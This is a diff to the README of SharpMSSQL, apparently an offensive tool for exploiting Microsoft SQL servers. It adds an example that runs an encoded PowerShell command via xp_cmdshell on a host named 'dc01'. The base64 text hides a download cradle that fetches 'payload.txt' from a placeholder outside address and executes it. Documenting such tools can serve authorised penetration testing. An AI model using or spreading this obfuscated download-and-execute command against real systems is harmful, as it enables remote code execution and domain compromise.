@@ -18,7 +18,9 @@ Just for enumeration and exploitation of some vulns
 ## Example for execute command with xp_cmdshell
 ```
 .\SharpMSSQL.exe appsrv01 master cmd whoami
+.\SharpMSSQL.exe dc01 master cmd 'powershell.exe -e aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAxADMANwAuADIAMQAzADcALgAyADEAMwA3AC4AMgAxADMANwAvAHAAYQB5AGwAbwBhAGQALgB0AHgAdAAnACkA'
 ```
+
 
 # Supported opertations
 - enum
